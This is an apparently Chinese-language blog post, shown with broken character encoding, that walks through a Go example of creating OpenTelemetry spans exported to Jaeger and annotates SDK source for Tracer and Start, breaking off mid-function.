itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‹æ¬¡ä¸€å®š57"/> <meta itemprop="url" content="https://juejin.cn/user/3722294009017404"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ OpenTelemetry æºç ä¸å®æˆ˜ï¼ˆä¸‹ç¯‡ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3722294009017404/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‹æ¬¡ä¸€å®š57
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:26:22.000Z" title="Thu Feb 05 2026 09:26:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>é€šè¿‡ä¸Šç¯‡çš„æºç æ‹†è§£ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº† <code>OpenTelemetry</code> çš„æ ¸å¿ƒåˆå§‹åŒ–é€»è¾‘ï¼Œæ¥ä¸‹æ¥æœ¬èŠ‚å°†è¿›è¡Œ<strong>æœ¬åœ°é“¾è·¯çš„å¿«é€Ÿå®æˆ˜</strong>ï¼ŒéªŒè¯æˆ‘ä»¬çš„åˆå§‹åŒ–ä»£ç æ˜¯å¦æœ‰æ•ˆï¼ŒåŒæ—¶æŒæ¡æœ€åŸºç¡€çš„ <code>Span</code> åˆ›å»ºã€é“¾è·¯è®°å½•æ–¹æ³•ã€‚ ä¸ºäº†é¿å…ä»£ç å†—ä½™ï¼Œæœ¬èŠ‚å°†ç›´æ¥å¤ç”¨ä¸Šç¯‡å®ç°çš„ <code>InitTracerProvider</code> åˆå§‹åŒ–å‡½æ•°ï¼ˆå¤§å®¶å¯ä»¥å°†ä¸Šç¯‡çš„ <code>trace</code> åŒ…ä»£ç å¤åˆ¶åˆ°å½“å‰é¡¹ç›®ä¸­ï¼Œæˆ–ç›´æ¥å¼•ç”¨å¯¹åº”åŒ…ï¼‰ã€‚æˆ‘ä»¬ä¼šæ„å»ºä¸€ä¸ªç®€å•çš„æœ¬åœ°è°ƒç”¨é“¾è·¯ï¼Œåˆ›å»ºçˆ¶å­/å¹³çº§ <code>Span</code>ï¼Œæ·»åŠ è‡ªå®šä¹‰å±æ€§å’Œäº‹ä»¶ï¼Œæœ€åé€šè¿‡ <code>Jaeger UI</code> æŸ¥çœ‹è¿½è¸ªç»“æœï¼Œå¿«é€Ÿä¸Šæ‰‹ <code>OpenTelemetry</code> çš„åŸºç¡€ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-1">æœ¬åœ°é“¾è·¯å¿«é€Ÿè½åœ°</h2>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"encoding/json"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/attribute"</span>
	<span class="hljs-string">"golang.org/x/sync/errgroup"</span>
	<span class="hljs-string">"time"</span>
)
<span class="hljs-comment">// è®°å½•é“¾è·¯</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcA</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	_, span := tr.Start(ctx, <span class="hljs-string">"func-a"</span>)
    <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯ä¸ºè¿™ä¸ª span æœ¬èº«æ·»åŠ å±æ€§ ä¹Ÿå°±æ˜¯ åªæœ‰ funcA èƒ½çœ‹åˆ° main å’Œ funcB çœ‹ä¸åˆ° å¯ä»¥çœ‹ä¸€ä¸‹è¿è¡Œç»“æœ</span>
    <span class="hljs-comment">// ç­‰å¤§å®¶çœ‹å®Œ Start æºç  è¿”å›çš„æ—¶å€™ å†…éƒ¨ä¼šåŠ ä¸Š è‡ªå·±è®¾ç½®çš„ Attributes å’Œ Event </span>
	span.SetAttributes(attribute.String(<span class="hljs-string">"name"</span>, <span class="hljs-string">"funA"</span>))
    span.AddEvent(<span class="hljs-string">"å®Œæˆ funcA"</span>)
	time.Sleep(time.Second)
	span.End()
}
<span class="hljs-comment">// è®°å½•é“¾è·¯</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcB</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	_, span := tr.Start(ctx, <span class="hljs-string">"func-b"</span>)
	fmt.Println(<span class="hljs-string">"trace:"</span>, span.SpanContext().TraceID(), span.SpanContext().SpanID())
	time.Sleep(time.Second)
	span.End()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	tp, _ := InitTracerProvider(common.Options{
		Name:     <span class="hljs-string">"basic_name"</span>,   <span class="hljs-comment">//å”¯ä¸€çš„æœåŠ¡å·</span>
		Endpoint: <span class="hljs-string">"http://127.0.0.1:14268/api/traces"</span>,  <span class="hljs-comment">// æ¢æˆè‡ªå·±æœåŠ¡å™¨çš„ipåœ°å€</span>
		Sampler:  <span class="hljs-number">1</span>,   <span class="hljs-comment">//è¿™é‡Œå°±å…¨é‡‡æ ·ç”¨äºå­¦ä¹ æµ‹è¯•</span>
		Batcher:  <span class="hljs-string">"jaeger"</span>,
	})
	ctx := context.Background()  <span class="hljs-comment">//å®šä¹‰ ä¸» context</span>
    <span class="hljs-comment">// æœ€åå¿…é¡»è¦å…³é—­ å¤§å®¶çœ‹è¿‡ä¸Šé¢æºç å°±çŸ¥é“ è¿™ä¸ªå…³é—­ç±»å‹æ˜¯ sync.Once æ— è®ºè°ƒç”¨å¤šå°‘æ¬¡ éƒ½åªæ‰§è¡Œä¸€æ¬¡</span>
	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		ctx, cancel := context.WithTimeout(context.Background(), <span class="hljs-number">5</span>*time.Second)
		<span class="hljs-keyword">defer</span> cancel()
		_ = tp.Shutdown(ctx)
	}()
	<span class="hljs-comment">// é‡ç‚¹é€»è¾‘ åœ¨è¿™é‡Œ ç¬¬ä¸€æ¬¡çš„è¯ ä¼šç”Ÿæˆ TracerID è¿™æ¡è¯·æ±‚ä¸­æ ¸å¿ƒå‚æ•°ï¼Œä¼šä¸€ç›´ä¼ é€’ä¸‹å» ä¸‹é¢æœ‰æºç è§£è¯»</span>
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	spanCtx, span := tr.Start(ctx, <span class="hljs-string">"func-main"</span>)
    <span class="hljs-comment">/*
     errgroup ä¸æ‡‚çš„è¯ æˆ‘ä¹‹å‰æ–‡ç« ä»‹ç»è¿‡ è¿™ä¸ªéå¸¸å¥½ç”¨ ä»¥åå°±å¯ä»¥æŠŠ sync.WaitGroup æ›¿æ¢æˆ errgroup 
     ä¸éœ€è¦å»å†™ add å’Œ doneï¼Œå› ä¸ºå†…éƒ¨éƒ½åšäº†  ä¸‹é¢ä»£ç å…¶å®å°±æ˜¯å¼€äº†ä¸¤ä¸ªåç¨‹å¹¶è¡Œæ‰§è¡Œè€Œå·²
     */</span>
	gw, gctx := errgroup.WithContext(spanCtx)
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcA(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcB(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	
	_ = gw.Wait()
    <span class="hljs-comment">// ä¸€å®šæ˜¯ç­‰åç¨‹æ‰§è¡Œå®Œäº† æ‰æŠŠ ä¸»çš„ span å…³é—­</span>
	span.End()

}

</code></pre>
<h2 data-id="heading-2">è¿è¡Œæ•ˆæœ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d75838aceaee4ab19c84a333e38e7fdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiL5qyh5LiA5a6aNTc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888385&amp;x-signature=7YGmvdsu0yvsWhXH3IUCVchb27w%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-3">æ ¸å¿ƒé€»è¾‘è®²è§£</h2>
<h3 data-id="heading-4"><code>otel.Tracer("basic_name")</code> æ ¸å¿ƒå‡½æ•°</h3>
<p>åœ¨æœ‰äº›ä¸­é—´ä»¶ï¼Œæˆ–è€…å¤§å‹é¡¹ç›®åœ¨ç”¨çš„æ—¶å€™å¯èƒ½æ²¡æœ‰ç”¨ <code>otel.Tracer()</code> å‡½æ•°ï¼Œè€Œæ˜¯å…ˆ <code>GetTracerProvider()</code> è·å¾—å…¨å±€çš„ <code>tp</code></p>
<p>ç„¶ååœ¨æ‰§è¡Œ <code>tp.Tracer("basic_name")</code>ï¼Œå¤§å®¶çŸ¥é“æˆ‘ä»¬ç”¨  <code>SetTracerProvider(...)</code> å»æ”¾è¿›å»ï¼Œè¿™ä¸ªæ—¶å€™åœ¨å»å–</p>
<p>è·Ÿ <code>otel.Tracer("basic_name")</code> è¿™ä¸ªæ˜¯ç­‰ä»·çš„ï¼Œå¦‚ä¸‹ä»£ç å…¶å®å°±æ˜¯å¸®æˆ‘ä»¬åœ¨è¿™ä¹ˆåš</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Tracer</span><span class="hljs-params">(name <span class="hljs-type">string</span>, opts ...trace.TracerOption)</span></span> trace.Tracer {
	<span class="hljs-keyword">return</span> GetTracerProvider().Tracer(name, opts...)
}

<span class="hljs-comment">// è¯¦ç»†è§£è¯» å†…éƒ¨é€»è¾‘ è¿™å°±æ˜¯æˆ‘ä»¬æ”¾ä¸Šå»çš„ tp </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *TracerProvider)</span></span> Tracer(name <span class="hljs-type">string</span>, opts ...trace.TracerOption) trace.Tracer {
	<span class="hljs-keyword">if</span> p.isShutdown.Load() {  <span class="hljs-comment">// æ˜¯å¦å…³é—­</span>
		<span class="hljs-keyword">return</span> noop.NewTracerProvider().Tracer(name, opts...)
	}
    <span class="hljs-comment">// è¿™ä¸ª opt... è§£åŒ…çš„ TracerOption è¿™ä¸ªç±»å‹ æˆ‘ä»¬æ²¡æœ‰ä¼   å°±æ˜¯ nil è¿™æ¡è¯­å¥å°±æ˜¯åˆå§‹åŒ–ä¸€ä¸‹ å°±å…¨æ˜¯ç©º</span>
	c := trace.NewTracerConfig(opts...)
    
	<span class="hljs-keyword">if</span> name == <span class="hljs-string">""</span> {   <span class="hljs-comment">//é˜²æ­¢æ²¡æœ‰name è¿™é‡Œæˆ‘ä»¬æœ‰</span>
		name = defaultTracerName
	}
    <span class="hljs-comment">// è¿™é‡Œæ˜¯ æ ¸å¿ƒ ç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ª Tracer ç¤ºä¾‹ï¼Œä»¥æˆ‘ä»¬ä¾‹å­æ¥çœ‹ é™¤äº†name å…¨ç©º</span>
	is := instrumentation.Scope{
		Name:       name,
		Version:    c.InstrumentationVersion(),
		SchemaURL:  c.SchemaURL(),
		Attributes: c.InstrumentationAttributes(),
	}

	t, ok := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (trace.Tracer, <span class="hljs-type">bool</span>) {
        <span class="hljs-comment">// å†æ¬¡æ£€æŸ¥ æ˜¯å› ä¸º å¦‚æœåœ¨ç”Ÿæˆ is çš„æ—¶å€™ å…³äº†è¿™é‡Œå†æ‰§è¡Œå°±ä¼šæœ‰é—®é¢˜</span>
		p.mu.Lock()
		<span class="hljs-keyword">defer</span> p.mu.Unlock()
        
		<span class="hljs-keyword">if</span> p.isShutdown.Load() {
			<span class="hljs-keyword">return</span> noop.NewTracerProvider().Tracer(name, opts...), <span class="hljs-literal">true</span>
		}
        <span class="hljs-comment">// åˆ¤æ–­ä¸€ä¸‹ æˆ‘ä»¬è¿™ä¸ª is åœ¨ä¸åœ¨æˆ‘ä»¬è¿™ä¸ªmapä¸­ã€‚å¦‚æœåœ¨æˆ‘ä»¬å°±å¤ç”¨ï¼Œå¦‚æœä¸åœ¨ï¼Œæˆ‘ä»¬å°±æ–°å»ºä¸€ä¸ªå®ä¾‹å­˜å…¥map</span>
        <span class="hljs-comment">// æ‰€ä»¥è¯´ is æ˜¯ å”¯ä¸€æ ‡è¯†ä¸€ä¸ªå®ä¾‹çš„</span>
		t, ok := p.namedTracer[is]
		<span class="hljs-keyword">if</span> !ok {
           	<span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ²¡æœ‰ </span>
			t = &amp;tracer{
				provider:             p,  <span class="hljs-comment">//çˆ¶å¼•ç”¨ p å°±æ˜¯ TracerProvider</span>
				instrumentationScope: is,  <span class="hljs-comment">// è‡ªå·±çš„å”¯ä¸€æ ‡è¯†</span>
			}

			<span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
            <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæŒ‡æ ‡é‡‡é›†çš„è‡ªå®šä¹‰ Tracer å®ä¾‹  å¦‚æœå…¨å±€å¯è§‚æµ‹æ€§å¼€å…³æœªå¼€å¯ï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå®ä¾‹ï¼Œä¸æ‰§è¡Œä»»ä½•æŒ‡æ ‡åˆ›å»ºé€»è¾‘</span>
            <span class="hljs-comment">// è¿™æ˜¯å…³äºç›‘æ§ç›¸å…³çš„äº‹æƒ…ï¼Œå¯åç»­å­¦ä¹ </span>
			t.inst, err = observ.NewTracer()
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				otel.Handle(err)
			}
			<span class="hljs-comment">// å­˜å…¥</span>
			p.namedTracer[is] = t
		}
		<span class="hljs-keyword">return</span> t, ok
	}()
	<span class="hljs-keyword">if</span> !ok {
		<span class="hljs-comment">// è¿™ä¸ªçš„æ„æ€ ç¬¬ä¸€æ¬¡æˆ–è€…æ²¡æ‰¾åˆ°ï¼Œæ–°å»ºäº† æ‰“ä¸ªæ—¥å¿—</span>
		global.Info(
			<span class="hljs-string">"Tracer created"</span>,
			<span class="hljs-string">"name"</span>,
			name,
			<span class="hljs-string">"version"</span>,
			is.Version,
			<span class="hljs-string">"schemaURL"</span>,
			is.SchemaURL,
			<span class="hljs-string">"attributes"</span>,
			is.Attributes,
		)
	}
	<span class="hljs-keyword">return</span> t
}
</code></pre>
<h3 data-id="heading-5"><code>tr.Start(ctx, "func-main")</code> å‡½æ•°</h3>
<p>è¿™ä¸ªæ—¶å€™æ‰æ˜¯çœŸæ­£å»ç”Ÿæˆ <code>TracerID</code> å’Œ <code>SpanID</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tr *tracer)</span></span> Start(ctx context.Context, name <span class="hljs-type">string</span>, options ...trace.SpanStartOption,
) (context.Context, trace.Span) {
    <span class="hljs-comment">// è¿™é‡Œæ­£å¸¸ä¹Ÿæ˜¯ ç©º æˆ‘ä»¬éƒ½æ²¡æ”¾ä¸œè¥¿ï¼Œè¯¥é…ç½®ä¸»è¦é¢„ç•™ç»™æ¡†æ¶/ä¸­é—´ä»¶ä½¿ç”¨ï¼Œç”¨äºåœ¨ Span åˆ›å»ºé˜¶æ®µæ³¨å…¥</span>
    <span class="hljs-comment">// æ¯”å¦‚ä¸­é—´ä»¶ä¼šåœ¨æ­¤é˜¶æ®µæ³¨å…¥ SpanKindã€Attributesã€Links ç­‰ï¼Œåç»­å¤§å®¶ä¼šæ˜ç™½</span>
	config := trace.NewSpanStartConfig(options...)
	
    <span class="hljs-comment">// ä¸èµ° è¿™æ˜¯å…œåº•åˆ¤æ–­</span>
	<span class="hljs-keyword">if</span> ctx == <span class="hljs-literal">nil</span> {
		ctx = context.Background()
	}
	<span class="hljs-comment">// è¿™ä¸ªæ˜¯é‡ç‚¹ åç»­æœ‰æºç  ä½œç”¨å°±æ˜¯æŸ¥æ‰¾ ctx é‡Œæœ‰æ²¡æœ‰çˆ¶ span</span>
	<span class="hljs-keyword">if</span> p := trace.SpanFromContext(ctx); p != <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯å·§å¦™çš„ç”¨æ–­è¨€å»åˆ¤æ–­æ˜¯å¦æœ‰ çˆ¶ span</span>
		<span class="hljs-keyword">if</span> sdkSpan, ok := p.(*recordingSpan); ok {
            <span class="hljs-comment">// æœ‰ TODO</span>
			sdkSpan.addChild()
		}
	}
	
    <span class="hljs-comment">// æ ¸å¿ƒ æ— è®ºæœ‰æ²¡æœ‰éƒ½ä¼šèµ°è¿™ä¸ª ç®€å•æ¥è®²å°±æ˜¯ TracerID å¤ç”¨ SpanID è¦æ–°å»º</span>
	s := tr.newSpan(ctx, name, &amp;config)
    <span class="hljs-comment">// è¿™é‡Œé€»è¾‘æ˜¯æœ€é‡è¦çš„ ç”¨äº ä¿å­˜çˆ¶ Span ä½¿å¾—é“¾è·¯å¯ä»¥å»¶ç»­   ä»£ç æˆ‘æ”¾åˆ°ä¸‹é¢ è¡¥å……</span>
    <span class="hljs-comment">// è€Œä¸”å¤§å®¶æœ‰ä¸ªè¯¯åŒº å°±æ˜¯å»æ‹¿ çˆ¶ Span æ˜¯æ‹¿æ ¹çš„ä¹ˆï¼Ÿ å¤§å®¶å¯ä»¥æ€è€ƒä¸€ä¸‹  ç»™å‡ºç»“æœ</span>
    <span class="hljs-comment">/*
    ç”±äºæ¯æ¬¡ start éƒ½ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•° trace.ContextWithSpan(ctx, s) æ–°å»ºä¸€ä¸ªctx1ç»§æ‰¿äº†ä¹‹å‰çš„ ctx çš„æ‰€æœ‰å…¶ä»–é”®å€¼å¯¹
    ä½†è¦†ç›–äº† currentSpanKey å¯¹åº”çš„å€¼  å¦‚æœæ˜¯main è°ƒç”¨ funA ç„¶å funA å†è°ƒç”¨ funB çš„è¯ è°ƒç”¨é“¾å¦‚ä¸‹
    main è°ƒç”¨ Startï¼šåˆ›å»ºæ ¹ spanï¼ˆs0ï¼‰ï¼Œè¿”å›ctx1
	funA è°ƒç”¨ Startï¼ˆä¼ å…¥ ctx1ï¼‰ï¼šåˆ›å»ºå­ spanï¼ˆs1ï¼Œçˆ¶ä¸º s0ï¼‰ï¼Œè¿”å›ctx2
	funB è°ƒç”¨ Startï¼ˆä¼ å…¥ ctx2ï¼‰ï¼šåˆ›å»ºå­ spanï¼ˆs2ï¼Œçˆ¶ä¸º s1ï¼‰ï¼Œè¿”å›ctx3
	åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼š
	main è°ƒç”¨ Startï¼šåˆ›å»ºæ ¹ spanï¼ˆs0ï¼‰ï¼Œè¿”å›ctx1
	funA è°ƒç”¨ Startï¼ˆä¼ å…¥ ctx1ï¼‰ï¼šåˆ›å»ºå­ spanï¼ˆs1ï¼Œçˆ¶ä¸º s0ï¼‰ï¼Œè¿”å›ctx2
	funB è°ƒç”¨ Startï¼ˆä¹Ÿæ˜¯ä¼ å…¥ ctx1ï¼‰ï¼šåˆ›å»ºå­ spanï¼ˆs2ï¼Œçˆ¶ä¸º s0ï¼‰ï¼Œè¿”å›ctx3
	funA å’Œ funB æ˜¯å¹³çº§çš„
	å¸Œæœ›å¤§å®¶å¯ä»¥ä»æˆ‘è®²è§£çš„ä»£ç ä¸Šï¼Œ
    */</span>
	newCtx := trace.ContextWithSpan(ctx, s)
    <span class="hljs-comment">// åŒç† ç”¨äºç»Ÿè®¡å’Œç›‘æ§</span>
	<span class="hljs-keyword">if</span> tr.inst.Enabled() {
		<span class="hljs-keyword">if</span> o, ok := s.(<span class="hljs-keyword">interface</span>{ setOrigCtx(context.Context) }); ok {
			o.setOrigCtx(newCtx)
		}
		psc := trace.SpanContextFromContext(ctx)
		tr.inst.SpanStarted(newCtx, psc, s)
	}
    
	<span class="hljs-comment">// å¤§å®¶åº”è¯¥æ¸…æ¥š çœŸæ­£ å®ç°é“¾è·¯è¿½è¸ªçš„æ˜¯ å†…éƒ¨çš„ SpanProcessor ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ³¨å†Œçš„ Jaeger æˆ–è€… Zipkin</span>
    <span class="hljs-comment">// åˆå§‹åŒ–æ—¶è®²è§£è¿‡å¯ä»¥æœ‰å¤šä¸ªSpanProcessorï¼Œå­˜åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ è¿™ä¸ªæ—¶å€™çœŸæ­£å¼€å§‹è®©åº•å±‚å¼€å§‹åˆå§‹åŒ–</span>
	<span class="hljs-keyword">if</span> rw, ok := s.(ReadWriteSpan); ok &amp;&amp; s.IsRecording() {
		sps := tr.provider.getSpanProcessors()
		<span class="hljs-keyword">for</span> _, sp := <span class="hljs-keyword">range</span> sps {
            <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯ Jaeger.OnStart(ctx, rw) æˆ–è€… Zipkin.OnStart(ctx, rw)</span>
			sp.sp.OnStart(ctx, rw)
		}
	}
    <span class="hljs-comment">// ä¸é‡è¦</span>
	<span class="hljs-keyword">if</span> rtt, ok := s.(runtimeTracer); ok {
		newCtx = rtt.runtimeTrace(newCtx)
	}

    <span class="hljs-comment">// è¿”å›</span>
	<span class="hljs-keyword">return</span> newCtx, s
}


<span class="hljs-comment">// è¡¥å……</span>
<span class="hljs-keyword">type</span> traceContextKeyType <span class="hljs-type">int</span>
<span class="hljs-keyword">const</span> currentSpanKey traceContextKeyType = <span class="hljs-literal">iota</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ContextWithSpan</span><span class="hljs-params">(parent context.Context, span Span)</span></span> context.Context {
    <span class="hljs-comment">// ä¸‹ä¸ªå†æ¥æ‰¾å°±å¯ä»¥æ‰¾åˆ°</span>
	<span class="hljs-keyword">return</span> context.WithValue(parent, currentSpanKey, span)
}

</code></pre>
<h3 data-id="heading-6"><code>SpanFromContext(ctx context.Context) </code> å‡½æ•°</h3>
<p>è¿™é‡Œè¿”å›çš„ <code>noopSpanInstance</code> æ˜¯å®˜æ–¹åˆ»æ„è®¾è®¡ç”¨äºç¨‹åºæ­£å¸¸æ‰§è¡Œçš„ï¼Œå¯ä»¥æŠŠå®ƒç†è§£æˆ <code>nil</code> ï¼Œå¦‚æœå®˜æ–¹ç”¨<code>nil</code> çš„è¯ï¼Œä¼šåœ¨å¾ˆå¤šåœ°æ–¹å»åˆ¤æ–­æ˜¯å¦æ˜¯<code>nil</code>ï¼Œä»£ç é‡æ¿€å¢ï¼Œæ ¸å¿ƒä»£ç è¢«åŸ‹æ²¡åˆ«äººä¹Ÿæ²¡å¿ƒæƒ…å»çœ‹ï¼Œå†ç”¨æ–­è¨€çš„å½¢å¼åˆ¤æ–­ï¼Œä»è€Œåˆ°åº•è¿”å›çš„æ˜¯ä»€ä¹ˆ</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SpanFromContext</span><span class="hljs-params">(ctx context.Context)</span></span> Span {
	<span class="hljs-keyword">if</span> ctx == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> noopSpanInstance
	}
